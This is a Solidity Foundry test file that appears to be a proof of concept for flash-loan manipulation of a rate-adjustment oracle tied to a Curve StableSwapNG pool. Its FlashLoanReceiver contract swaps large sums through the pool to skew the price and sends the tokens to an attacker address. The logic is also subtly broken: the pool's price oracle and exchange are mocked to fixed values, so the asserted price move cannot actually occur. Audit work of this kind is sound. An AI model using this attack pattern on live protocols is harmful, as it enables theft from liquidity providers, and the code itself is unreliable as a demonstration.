// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {IERC20} from "openzeppelin-contracts/interfaces/IERC20.sol";
import {IERC4626} from "openzeppelin-contracts/interfaces/IERC4626.sol";
import {IPrincipalToken} from "src/interfaces/IPrincipalToken.sol";
import {IStableSwapNG} from "src/interfaces/IStableSwapNG.sol";
import {IRateAdjustmentOracle} from "src/interfaces/IRateAdjustmentOracle.sol";
import {IFactorySNG} from "src/interfaces/IFactorySNG.sol";
import {RateAdjustmentOracle} from "src/amm/RateAdjustmentOracle.sol";

interface IFlashLoanProvider {
    function flashLoan(uint256 amount, address recipient, bytes calldata data) external;
}

contract FlashLoanReceiver {
    IStableSwapNG public curvePool;
    address public ibt;
    address public pt;
    address public attacker;
    IRateAdjustmentOracle public oracle;
    
    constructor(address _curvePool, address _ibt, address _pt, address _oracle) {
        curvePool = IStableSwapNG(_curvePool);
        ibt = _ibt;
        pt = _pt;
        oracle = IRateAdjustmentOracle(_oracle);
        attacker = msg.sender;
    }
    
    function executeFlashLoan(bytes calldata data) external {
        // Flash loan logic to manipulate pool balances
        (uint256 ibtAmount, uint256 ptAmount) = abi.decode(data, (uint256, uint256));
        
        // Approve tokens to pool for manipulation
        IERC20(ibt).approve(address(curvePool), ibtAmount);
        IERC20(pt).approve(address(curvePool), ptAmount);
        
        // Manipulate pool balance by performing swaps
        if (ibtAmount > 0) {
            curvePool.exchange(0, 1, ibtAmount, 0);
        }
        
        if (ptAmount > 0) {
            curvePool.exchange(1, 0, ptAmount, 0);
        }
        
        // Return tokens to attacker
        uint256 ibtBalance = IERC20(ibt).balanceOf(address(this));
        uint256 ptBalance = IERC20(pt).balanceOf(address(this));
        
        if (ibtBalance > 0) {
            IERC20(ibt).transfer(attacker, ibtBalance);
        }
        
        if (ptBalance > 0) {
            IERC20(pt).transfer(attacker, ptBalance);
        }
    }
}

contract OracleManipulationTest is Test {
    address public admin;
    address public attacker;
    address public curvePool;
    address public ibt;
    address public pt;
    address public factory;
    RateAdjustmentOracle public oracle;
    FlashLoanReceiver public flashLoanReceiver;
    
    uint256 public initialLiquidity = 1_000_000 * 1e18;
    uint256 public manipulationAmount = 10_000_000 * 1e18;
    uint256 public initialPrice = 0.95e18; // 95% of face value
    uint256 public DURATION = 365 days;
    
    function setUp() public {
        admin = makeAddr("admin");
        attacker = makeAddr("attacker");
        
        // Set up mock environment
        vm.startPrank(admin);
        
        // Deploy mock tokens and pool
        ibt = deployMockIBT("Interest Bearing Token", "IBT", 18);
        pt = deployMockPT("Principal Token", "PT", ibt);
        curvePool = deployMockCurvePool(ibt, pt, initialPrice);
        
        // Deploy and initialize oracle
        oracle = new RateAdjustmentOracle();
        oracle.initialize(admin);
        oracle.post_initialize(
            block.timestamp,
            block.timestamp + DURATION,
            initialPrice,
            curvePool
        );
        
        // Deploy flash loan receiver for attack
        flashLoanReceiver = new FlashLoanReceiver(curvePool, ibt, pt, address(oracle));
        
        vm.stopPrank();
        
        // Fund attacker with some tokens for gas
        deal(ibt, attacker, 10 * 1e18);
        deal(pt, attacker, 10 * 1e18);
        
        // Simulate passing of time (30 days into the term)
        vm.warp(block.timestamp + 30 days);
    }
    
    function testOracleManipulation() public {
        vm.startPrank(attacker);
        
        // Record normal oracle value before attack
        uint256 normalOracleValue = oracle.value();
        
        console.log("Normal oracle value:", normalOracleValue);
        
        // Execute attack (simulate flash loan and pool manipulation)
        deal(ibt, address(flashLoanReceiver), manipulationAmount);
        flashLoanReceiver.executeFlashLoan(abi.encode(manipulationAmount, 0));
        
        // Check manipulated oracle value
        uint256 manipulatedOracleValue = oracle.value();
        
        console.log("Manipulated oracle value:", manipulatedOracleValue);
        
        // Calculate price impact
        uint256 priceImpact = normalOracleValue > manipulatedOracleValue ?
            ((normalOracleValue - manipulatedOracleValue) * 100) / normalOracleValue :
            ((manipulatedOracleValue - normalOracleValue) * 100) / normalOracleValue;
            
        console.log("Price impact percentage:", priceImpact, "%");
        
        // Demonstrate significant price deviation (>5%)
        assertGt(priceImpact, 5, "Oracle price should be significantly manipulated");
        
        vm.stopPrank();
    }
    
    // Helper function to deploy mock IBT
    function deployMockIBT(string memory name, string memory symbol, uint8 decimals) internal returns (address) {
        // Deploy mock IBT contract
        // In a real test, you'd use a proper mock or fork a real IBT
        address mockIBT = makeAddr("mockIBT");
        vm.mockCall(
            mockIBT,
            abi.encodeWithSelector(IERC20.transferFrom.selector),
            abi.encode(true)
        );
        vm.mockCall(
            mockIBT,
            abi.encodeWithSelector(IERC20.transfer.selector),
            abi.encode(true)
        );
        vm.mockCall(
            mockIBT,
            abi.encodeWithSelector(IERC20.approve.selector),
            abi.encode(true)
        );
        return mockIBT;
    }
    
    // Helper function to deploy mock PT
    function deployMockPT(string memory name, string memory symbol, address _ibt) internal returns (address) {
        // Deploy mock PT contract
        address mockPT = makeAddr("mockPT");
        vm.mockCall(
            mockPT,
            abi.encodeWithSelector(IERC20.transferFrom.selector),
            abi.encode(true)
        );
        vm.mockCall(
            mockPT,
            abi.encodeWithSelector(IERC20.transfer.selector),
            abi.encode(true)
        );
        vm.mockCall(
            mockPT,
            abi.encodeWithSelector(IERC20.approve.selector),
            abi.encode(true)
        );
        vm.mockCall(
            mockPT,
            abi.encodeWithSelector(IPrincipalToken.getPTRate.selector),
            abi.encode(0.97e18)  // 97% of face value as example
        );
        vm.mockCall(
            mockPT,
            abi.encodeWithSelector(IPrincipalToken.maturity.selector),
            abi.encode(block.timestamp + DURATION)
        );
        return mockPT;
    }
    
    // Helper function to deploy mock Curve Pool
    function deployMockCurvePool(address _ibt, address _pt, uint256 _initialPrice) internal returns (address) {
        address mockPool = makeAddr("mockCurvePool");
        
        // Set up mock functions for the pool
        vm.mockCall(
            mockPool,
            abi.encodeWithSelector(IStableSwapNG.coins.selector, 0),
            abi.encode(_ibt)
        );
        vm.mockCall(
            mockPool,
            abi.encodeWithSelector(IStableSwapNG.coins.selector, 1),
            abi.encode(_pt)
        );
        
        // Mock price oracle function - this is what we'll manipulate
        vm.mockCall(
            mockPool,
            abi.encodeWithSelector(IStableSwapNG.price_oracle.selector, 0),
            abi.encode(_initialPrice)
        );
        
        // Mock exchange function to simulate manipulation
        vm.mockCall(
            mockPool,
            abi.encodeWithSelector(IStableSwapNG.exchange.selector),
            abi.encode(true)
        );
        
        return mockPool;
    }
}
